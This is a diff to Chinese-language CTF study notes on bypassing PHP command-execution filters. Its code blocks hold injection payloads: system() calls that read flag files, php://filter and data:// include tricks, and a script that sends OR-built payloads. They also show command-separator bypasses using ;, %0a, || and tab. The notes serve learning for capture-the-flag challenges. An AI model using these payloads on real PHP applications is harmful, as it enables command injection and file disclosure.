@@ -74,6 +74,7 @@ PHP探针是用来探测空间、服务器运行状况和PHP信息的。探针�
 ## 9. 命令执行<br>
 如果网页中有命令执行相关的函数，就可以想办法绕过前期的检测(比如`正则校验`)，然后执行它！<br>
 常见的`php`命令注入:<br>
+**这里是遇到了类似 eval($c)的绕过思路**<br>
 ```php
 c=system("cat fl*g.php | grep  -E 'fl.g' "); // 获取文件的内容，然后用grep 采用正则表达式的方法，获得flag
 c=system("cat fl*g.php"); // 需要采用view-source协议
@@ -117,6 +118,7 @@ c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
 c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 还有更高手！<br>
+**到这后，主要是发现 include($c)时的绕过办法**<br>
 ```php
 //data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
 //text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
@@ -126,7 +128,7 @@ c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag
 c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
 c=data://text/plain,<?php system("tac fl*g.php")?>
 ```
-当然,还有通过`|`符号或来得到我们想要的可见字符：<br>
+当然,还有通过`|`符号或来得到我们想要的可见字符：**这个办法用来解决eval("echo($c);");**<br>
 ```python
 import re
 import urllib
@@ -170,9 +172,10 @@ response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
 print(response.text)
 ```
 命令注入的绕过真的有很多有意思的故事呢：<br>
+**如果你遇到了一个system($c." >/dev/null 2>&1");可以尝试以下方式绕过**<br>
 ```php
-// 如果你遇到了一个system($c." >/dev/null 2>&1");可以尝试以下方式绕过
 c=cat flag.php; //;是用来分割命令的
 c=nl flag.php%0a //%0a是换行符
 c=tac flag.php|| // ||连接2个命令，如果前面一个命令执行成功，就不执行后一个命令
+c=tac%09fl*g.php%0a //%09是tab键
 ```
